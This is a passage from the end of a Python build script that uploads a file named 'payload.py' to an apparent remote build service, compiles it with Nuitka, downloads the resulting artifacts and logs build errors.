                    dyn_pip = scanner.get_pip_install_cmd()
                    dyn_flags = scanner.get_nuitka_args()
                    farm.upload_file(payload, "payload.py")
                    farm.create_workflow("payload.py", exclude_android=args.exclude_android, pip_command=dyn_pip, extra_nuitka_flags=dyn_flags, python_version=args.python)
                    run_id = farm.trigger_and_wait(exclude_android=args.exclude_android)
                    if run_id:
                        dist_dir = os.path.join(os.path.dirname(os.path.abspath(payload)), "dist")
                        farm.download_artifacts(run_id, dist_dir)
                        print(f"\n[SUCCESS] Artifacts downloaded to: {dist_dir}")
    except KeyboardInterrupt: print("\n[-] Cancelled."); sys.exit(0)
    except Exception as e:
        with open("build_error.log", "w") as f:
            f.write(traceback.format_exc())
        UI.fatal(f"Critical Build Error: {e}")
        print(f"     [!] Details logged to: {os.path.abspath('build_error.log')}")
        sys.exit(1)


if __name__ == "__main__":
    main()
